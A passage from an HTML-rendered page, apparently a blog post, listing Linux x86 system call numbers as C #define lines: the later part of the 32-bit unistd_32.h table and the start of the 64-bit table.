class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaction 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sgetmask 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ssetmask 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigsuspend 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigpending 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldlstat 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readdir 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_profil 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketcall 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_olduname 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_idle 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86old 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ipc 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigreturn 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigprocmask 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bdflush 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__llseek 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__newselect 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ugetrlimit 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap2 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate64 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate64 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat64 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat64 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat64 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown32 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid32 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid32 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid32 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid32 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid32 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid32 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups32 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups32 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown32 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid32 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid32 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid32 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid32 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown32 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid32 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid32 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid32 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid32 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile64 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs64 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs64 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64_64 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatat64 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 328</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 329</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 330</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 331</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 332</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 334</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 336</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 338</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 339</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 340</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 341</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 342</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 343</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 344</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 345</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 346</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 347</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 348</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 349</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 351</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 352</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 353</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 354</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 355</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 356</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 357</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 358</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 359</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 360</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 361</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 362</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 365</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 366</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 367</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 368</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 369</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 370</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recfrom 371</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 372</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 373</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 374</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 375</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 376</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 377</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 378</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure>

<hr>
<h3><span id="64-ä½">64 ä½</span></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 35</span></span><br><span 